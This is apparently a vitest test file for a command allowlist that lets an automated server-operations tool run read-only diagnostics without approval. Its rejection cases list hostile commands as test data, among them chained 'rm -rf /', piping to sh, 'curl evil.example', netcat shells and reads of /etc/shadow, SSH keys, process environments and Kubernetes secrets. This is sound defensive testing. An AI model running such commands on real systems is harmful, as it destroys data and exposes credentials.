import { describe, expect, it } from "vitest";
import { isReadOnlyCommand } from "../../../src/backend/tools/command-allowlist.js";

/**
 * These commands can run without a per-command approval click, so the parser
 * has to refuse anything that could become a second command. Substring
 * matching would pass "df; rm -rf /", which is the whole reason this is
 * argv-based.
 */
describe("isReadOnlyCommand", () => {
  it("allows plain diagnostics", () => {
    for (const command of [
      "df -h",
      "uptime",
      "free -m",
      "whoami",
      "ps aux",
      "lsblk",
      "uname -a",
      "/usr/bin/df -h",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
  });

  it("rejects command chaining and redirection", () => {
    for (const command of [
      "df; rm -rf /",
      "df && curl evil.example",
      "df || reboot",
      "df | sh",
      "df > /etc/passwd",
      "df >> /etc/passwd",
      "cat < /etc/shadow",
      "echo `whoami`",
      "echo $(id)",
      "df\nrm -rf /",
      "df \\\n rm",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("rejects privilege escalation", () => {
    for (const command of ["sudo df -h", "su root", "doas df", "env df"]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("rejects commands that are not on the list", () => {
    for (const command of ["rm -rf /", "curl evil.example", "vi /etc/passwd"]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("limits systemctl and docker to read-only subcommands", () => {
    expect(isReadOnlyCommand("systemctl status nginx").allowed).toBe(true);
    expect(isReadOnlyCommand("systemctl restart nginx").allowed).toBe(false);
    expect(isReadOnlyCommand("systemctl stop nginx").allowed).toBe(false);

    expect(isReadOnlyCommand("docker ps").allowed).toBe(true);
    expect(isReadOnlyCommand("docker stats --no-stream").allowed).toBe(true);
    expect(isReadOnlyCommand("docker rm -f web").allowed).toBe(false);
    expect(isReadOnlyCommand("docker exec -it web sh").allowed).toBe(false);
  });

  it("limits cat to safe paths", () => {
    expect(isReadOnlyCommand("cat /proc/meminfo").allowed).toBe(true);
    expect(isReadOnlyCommand("cat /etc/os-release").allowed).toBe(true);
    expect(isReadOnlyCommand("cat /etc/shadow").allowed).toBe(false);
    expect(isReadOnlyCommand("cat ~/.ssh/id_rsa").allowed).toBe(false);
    expect(isReadOnlyCommand("cat").allowed).toBe(false);
  });

  it("keeps cat inside its paths and away from process secrets", () => {
    for (const command of [
      "cat /proc/../etc/shadow",
      "cat /sys/../../home/alice/.ssh/id_rsa",
      "cat /proc/self/environ",
      "cat /proc/1/environ",
      "cat /proc/thread-self/cmdline",
      "cat /proc/*/environ",
      "cat /sys//../etc/passwd",
      "cat proc/meminfo",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
    expect(isReadOnlyCommand("cat /proc/loadavg").allowed).toBe(true);
    expect(isReadOnlyCommand("cat /sys/class/net/eth0/operstate").allowed).toBe(
      true,
    );
  });

  it("leaves out subcommands that print environment variables", () => {
    expect(isReadOnlyCommand("docker inspect web").allowed).toBe(false);
    expect(isReadOnlyCommand("systemctl show nginx").allowed).toBe(false);
  });

  it("allows docker inspect only for state, limits and restart policy", () => {
    for (const command of [
      "docker inspect --format '{{json .State}}' web",
      "docker inspect -f '{{.State.Status}} {{.RestartCount}}' web db",
      "docker inspect --format='{{.State.OOMKilled}}' web",
      "docker inspect --format '{{.Name}} restarts={{.RestartCount}} memory={{.HostConfig.Memory}} {{json .State.Health}}' web",
      "docker inspect --format '{{.HostConfig.RestartPolicy.Name}}' web",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "docker inspect web",
      "docker inspect --format '{{json .}}' web",
      "docker inspect --format '{{.Config.Env}}' web",
      "docker inspect --format '{{json .Config}}' web",
      "docker inspect --format '{{.HostConfig.Binds}}' web",
      "docker inspect --format '{{.HostConfig.MemoryX}}' web",
      "docker inspect --format '{{index .Config.Env 0}}' web",
      "docker inspect --format '{{range .Config.Env}}{{.}}{{end}}' web",
      "docker inspect --format '{{.State}}' web '{{.Config.Env}}'",
      "docker inspect --format '{{.State}}' --format '{{.Config.Env}}' web",
      "docker inspect --format '{{.State}}'",
      "docker inspect --type image --format '{{.State}}' web",
      "docker inspect --format '{{.State}} {' web",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows docker logs and stats only when they end on their own", () => {
    for (const command of [
      "docker logs --tail 200 web",
      "docker logs --tail=50 --timestamps web",
      "docker logs -n 100 --since 1h web",
      "docker stats --no-stream",
      "docker stats --no-stream --format '{{.Name}} {{.MemPerc}}' web",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "docker logs web",
      "docker logs 5",
      "docker logs -f --tail 10 web",
      "docker logs --follow --tail 10 web",
      "docker logs --tail 5000 web",
      "docker logs --tail all web",
      "docker logs --tail 10 web db",
      "docker stats",
      "docker stats web",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows the dnf and yum advisory and reboot queries", () => {
    for (const command of [
      "dnf updateinfo summary",
      "yum updateinfo summary",
      "dnf updateinfo list security",
      "dnf updateinfo list --security --sec-severity Critical",
      "dnf -q updateinfo list --security",
      "dnf needs-restarting -r",
      "yum needs-restarting -r",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "dnf updateinfo",
      "dnf updateinfo info",
      "dnf updateinfo list --security --sec-severity",
      "dnf needs-restarting",
      "dnf needs-restarting -s",
      "dnf check-update -r",
      "dnf upgrade --security",
      "dnf upgrade-minimal --security -y",
      "yum update --security",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("lets cat read which packages want a reboot, and nothing next to it", () => {
    expect(isReadOnlyCommand("cat /var/run/reboot-required.pkgs").allowed).toBe(
      true,
    );
    expect(isReadOnlyCommand("cat /run/reboot-required.pkgs").allowed).toBe(
      true,
    );
    for (const command of [
      "cat /var/run/reboot-required.pkgs.bak",
      "cat /var/run/secrets",
      "cat /run/reboot-required.pkgs/../../etc/shadow",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("rejects an empty command", () => {
    expect(isReadOnlyCommand("").allowed).toBe(false);
    expect(isReadOnlyCommand("   ").allowed).toBe(false);
  });

  it("allows the read-only checks auto-ops needs", () => {
    for (const command of [
      "docker system df",
      "docker system df -v",
      "find /var/log -type f -name '*.gz' -mtime +7 -ls",
      "find / -xdev -size +1G",
      "ping -c 3 -W 2 10.0.0.5",
      "nc -z -w 3 10.0.0.5 22",
      "nc -zv 10.0.0.5 22",
      "qm status 101",
      "qm list",
      "pct list",
      "pct status 200",
      "timedatectl",
      "timedatectl show",
      "openssl x509 -noout -enddate -in /etc/ssl/site.pem",
      "apt list --upgradable",
      "dnf check-update -q --security",
      "yum check-update",
      "needrestart -b",
      "test -f /var/run/reboot-required",
      "[ -f /var/run/reboot-required ]",
      "journalctl --disk-usage",
      "ip addr show",
      "ip route get 1.1.1.1",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
  });

  it("refuses the writing forms of those commands", () => {
    for (const command of [
      "docker system prune -af",
      "docker system df prune",
      "find /var/log -name '*.gz' -delete",
      "find / -exec rm {} +",
      "find / -execdir rm",
      "find / -ok rm",
      "find / -fprint /etc/cron.d/x",
      "find / -fprintf /tmp/x %p",
      "find / -fls /tmp/x",
      "find / -'del'\"ete\"",
      "ping 10.0.0.5",
      "ping 8",
      "ping -c 1000 10.0.0.5",
      "ping -f -c 3 10.0.0.5",
      "nc 10.0.0.5 22",
      "nc -l -p 4444",
      "nc -z -e /bin/sh 10.0.0.5 22",
      "nc -zc sh 10.0.0.5 22",
      "qm start 101",
      "qm destroy 101",
      "pct stop 200",
      "timedatectl set-time 12:00",
      "timedatectl set-ntp false",
      "openssl x509 -in /etc/ssl/a.pem -out /etc/ssl/b.pem",
      "openssl x509 -noout -in /etc/ssl/a.pem -out /tmp/b",
      "openssl req -new",
      "openssl x509 -noout -in relative.pem",
      "apt install curl",
      "apt list --upgradable curl",
      "dnf update -y",
      "yum check-update && yum update",
      "needrestart -r a",
      "needrestart",
      "test -w /etc/passwd",
      "[ -f /etc/passwd",
      "journalctl --vacuum-time=1d",
      "journalctl --rotate",
      "ip link set eth0 down",
      "ip route add default via 10.0.0.1",
      "ip neigh flush all",
      "date -s 2020-01-01",
      "date --set=2020-01-01",
      "hostname evil",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows kubectl reads, also as k3s kubectl", () => {
    for (const command of [
      "kubectl get pods -A",
      "kubectl -n kube-system get pods -o wide",
      "kubectl get pods --namespace=web -l app=web --no-headers",
      "kubectl get all -o wide",
      "kubectl get configmaps",
      "kubectl get cm -n web -o name",
      "kubectl get nodes -o json",
      "kubectl get svc,ep -o yaml",
      "kubectl get nodes -o 'jsonpath={.items[*].status.capacity}'",
      "kubectl get events -A --sort-by=.lastTimestamp",
      "kubectl get pods --sort-by=.status.containerStatuses[0].restartCount",
      "kubectl get pods --sort-by .metadata.creationTimestamp",
      "kubectl describe node worker-1",
      "kubectl describe pvc data -n db",
      "kubectl top nodes",
      "kubectl top pods -A --containers",
      "kubectl version",
      "kubectl cluster-info",
      "kubectl api-resources -o wide",
      "kubectl logs web-7c9 --tail=200",
      "kubectl logs deploy/web -c app --tail 100 --previous",
      "kubectl events -A",
      "kubectl events -n web --for pod/web-7c9 -o json",
      "kubectl auth can-i list pods",
      "kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get nodes",
      "k3s kubectl get pods -A",
      "/usr/local/bin/k3s kubectl top nodes",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
  });

  it("keeps kubectl away from secrets, writes and streams", () => {
    for (const command of [
      "kubectl get secrets",
      "kubectl get secret db -o yaml",
      "kubectl get Secrets -A",
      "kubectl get secret/db",
      "kubectl get pods,secrets",
      "kubectl get pod/web secret/db",
      "kubectl get secrets.v1. -A",
      "kubectl describe secret db",
      "kubectl get configmap app -o yaml",
      "kubectl get cm -o json",
      "kubectl describe configmap app",
      "kubectl get pods -o yaml",
      "kubectl get deploy web -o json",
      "kubectl get pods -o 'jsonpath={.items[*].spec.containers[*].env}'",
      "kubectl get pods -o custom-columns=ENV:.spec.containers[0].env",
      "kubectl get pods -o go-template-file=/tmp/t",
      "kubectl get pods -oyaml",
      "kubectl get pods --sort-by=.spec.containers[0].env[0].value",
      "kubectl describe pod web",
      "kubectl describe deploy web",
      "kubectl describe all",
      "kubectl describe",
      "kubectl get --raw /api/v1/namespaces/default/secrets",
      "kubectl get pods -w",
      "kubectl get pods --watch",
      "kubectl get pods --token abc",
      "kubectl get pods --as system:admin",
      "kubectl get pods --server https://evil.example",
      "kubectl get pods -v=9",
      "kubectl get pods --kubeconfig kube.yaml",
      "kubectl cluster-info dump",
      "kubectl top",
      "kubectl api-resources -o json",
      "kubectl logs web",
      "kubectl logs web --tail 5000",
      "kubectl logs web --tail=-1",
      "kubectl logs -f web --tail 10",
      "kubectl logs web --follow --tail 10",
      "kubectl logs web db --tail 10",
      "kubectl events -w",
      "kubectl auth whoami",
      "kubectl exec -it web -- sh",
      "kubectl cp web:/etc/passwd /tmp/p",
      "kubectl port-forward web 8080:80",
      "kubectl proxy",
      "kubectl apply -f app.yaml",
      "kubectl delete pod web",
      "kubectl edit deploy web",
      "kubectl patch deploy web -p {}",
      "kubectl scale deploy web --replicas 0",
      "kubectl rollout restart deploy web",
      "kubectl drain worker-1",
      "kubectl cordon worker-1",
      "kubectl label node worker-1 a=b",
      "kubectl annotate pod web a=b",
      "kubectl",
      "k3s kubectl get secrets -A",
      "k3s kubectl delete pod web",
      "k3s server",
      "k3s etcd-snapshot save",
      "k3s ctr images ls",
      "k3s",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows crictl listings and bounded logs, never inspect or info", () => {
    for (const command of [
      "crictl ps",
      "crictl ps -a --name web",
      "crictl pods --namespace kube-system",
      "crictl images",
      "crictl images --digests nginx",
      "crictl stats",
      "crictl stats -a --pod 1f2e",
      "crictl version",
      "crictl logs --tail=200 3a1b",
      "crictl logs --tail 50 -p 3a1b",
      "k3s crictl ps -a",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "crictl inspect 3a1b",
      "crictl inspectp 1f2e",
      "crictl inspecti nginx",
      "crictl info",
      "crictl ps -o json",
      "crictl pods -v",
      "crictl stats -w",
      "crictl logs 3a1b",
      "crictl logs -f --tail 10 3a1b",
      "crictl logs --tail 5000 3a1b",
      "crictl logs --tail 10 3a1b 4c2d",
      "crictl exec -it 3a1b sh",
      "crictl rm 3a1b",
      "crictl rmi --prune",
      "crictl stop 3a1b",
      "crictl pull nginx",
      "crictl -r unix:///run/x.sock ps",
      "crictl constructor",
      "crictl",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows nvidia-smi queries, never setters, resets or loops", () => {
    for (const command of [
      "nvidia-smi",
      "nvidia-smi -L",
      "nvidia-smi -q",
      "nvidia-smi -q -d MEMORY,UTILIZATION -i 0",
      "nvidia-smi -i 1",
      "nvidia-smi --query-gpu=name,temperature.gpu,utilization.gpu,memory.used --format=csv,noheader,nounits",
      "nvidia-smi --query-compute-apps=pid,used_memory --format=csv",
      "nvidia-smi topo -m",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "nvidia-smi -r",
      "nvidia-smi --gpu-reset -i 0",
      "nvidia-smi -pm 1",
      "nvidia-smi -pl 200",
      "nvidia-smi -c 3",
      "nvidia-smi -ac 5001,1590",
      "nvidia-smi -rac",
      "nvidia-smi -lgc 300,1500",
      "nvidia-smi -rgc",
      "nvidia-smi -lmc 5001",
      "nvidia-smi -mig 1",
      "nvidia-smi -e 0",
      "nvidia-smi -am 1",
      "nvidia-smi -caa",
      "nvidia-smi -dm 0",
      "nvidia-smi --auto-boost-default=0",
      "nvidia-smi -l 5",
      "nvidia-smi --loop=1",
      "nvidia-smi -lms 500",
      "nvidia-smi -q -f /tmp/out",
      "nvidia-smi -d MEMORY",
      "nvidia-smi --query-gpu=name",
      "nvidia-smi --query-gpu=name --format=xml",
      "nvidia-smi dmon",
      "nvidia-smi pmon",
      "nvidia-smi topo -p2p r",
      "nvidia-smi mig -cgi 9",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows zpool and zfs reads that end on their own", () => {
    for (const command of [
      "zpool status",
      "zpool status -x",
      "zpool status -v tank",
      "zpool list",
      "zpool list -H -o name,size,alloc,free,cap,health tank",
      "zpool iostat",
      "zpool iostat -v tank",
      "zpool iostat tank 2 5",
      "zpool iostat 1 3",
      "zfs list",
      "zfs list -H -o name,used,avail -t filesystem -r tank",
      "zfs get compression,compressratio tank/data",
      "zfs get -H -o name,value used",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "zpool status 5",
      "zpool status tank 5 3",
      "zpool list 1",
      "zpool iostat 5",
      "zpool iostat tank 1 100",
      "zpool iostat 60 5",
      "zpool create tank sda",
      "zpool destroy tank",
      "zpool scrub tank",
      "zpool import -a",
      "zpool export tank",
      "zpool clear tank",
      "zpool set autoexpand=on tank",
      "zfs get all tank",
      "zfs get com.example:secret tank",
      "zfs get",
      "zfs list -o name,com.example:note",
      "zfs create tank/x",
      "zfs destroy -r tank",
      "zfs set compression=lz4 tank",
      "zfs send tank@a",
      "zfs receive tank/b",
      "zfs rollback tank@a",
      "zfs snapshot tank@a",
      "zfs mount -a",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows systemd-detect-virt queries only", () => {
    for (const command of [
      "systemd-detect-virt",
      "systemd-detect-virt --container",
      "systemd-detect-virt -v",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "systemd-detect-virt --list",
      "systemd-detect-virt -c -v",
      "systemd-detect-virt --private-users",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("allows Proxmox status reads and a listed set of API paths", () => {
    for (const command of [
      "pvesm status",
      "pvesm status --storage local-lvm",
      "pvesm list local",
      "pvesm list local --content backup",
      "pvecm status",
      "pvecm nodes",
      "pveversion",
      "pveversion -v",
      "pvesh get /cluster/resources --type vm --output-format json",
      "pvesh get /nodes",
      "pvesh get /nodes/pve1/status",
      "pvesh get /nodes/pve1/qemu/101/status/current",
      "pvesh get /nodes/pve1/rrddata --timeframe hour",
      "pvesh get /nodes/pve1/tasks/UPID:pve1:0001A2B3:00C4D5E6:65000000:vzdump::root@pam:/log",
      "pvesh get /access/users --output-format=yaml",
      "qm list",
      "pct status 200",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
    for (const command of [
      "pvesm alloc local 101 vm-101-disk-1 4G",
      "pvesm free local:101/vm-101-disk-0.qcow2",
      "pvesm set local --disable 1",
      "pvesm list",
      "pvecm add 10.0.0.1",
      "pvecm expected 1",
      "pveversion --foo",
      "pveperf",
      "pvesh create /nodes/pve1/qemu/101/status/stop",
      "pvesh set /cluster/options --keyboard en-us",
      "pvesh delete /nodes/pve1/qemu/101",
      "pvesh get /nodes/pve1/qemu/101/config",
      "pvesh get /nodes/pve1/lxc/200/config",
      "pvesh get /nodes/pve1/qemu/101/pending",
      "pvesh get /nodes/pve1/qemu/101/agent/file-read --file /etc/shadow",
      "pvesh get /nodes/pve1/storage/pbs/file-restore/download",
      "pvesh get /cluster/acme/plugins",
      "pvesh get /cluster/notifications/endpoints/smtp",
      "pvesh get /access/ticket",
      "pvesh get /access/users/root@pam/token",
      "pvesh get /access/tfa",
      "pvesh get /nodes/pve1/subscription",
      "pvesh get /nodes/*/status",
      "pvesh get /nodes/pve1/status --output-format csv",
      "pvesh get /nodes/pve1/status -output-format json",
      "pvesh get",
      "qm config 101",
      "pct config 200",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("lists systemd timers and still keeps the k3s token unread", () => {
    expect(isReadOnlyCommand("systemctl list-timers --all").allowed).toBe(true);
    for (const command of [
      "cat /etc/rancher/k3s/config.yaml",
      "cat /var/lib/rancher/k3s/server/token",
      "cat /etc/rancher/k3s/k3s.yaml",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("refuses sudo before the new commands as before every other", () => {
    for (const command of [
      "sudo -n kubectl get pods",
      "sudo -n crictl ps",
      "sudo -n zpool status",
      "sudo nvidia-smi",
      "sudo -n pvesh get /nodes",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });
});
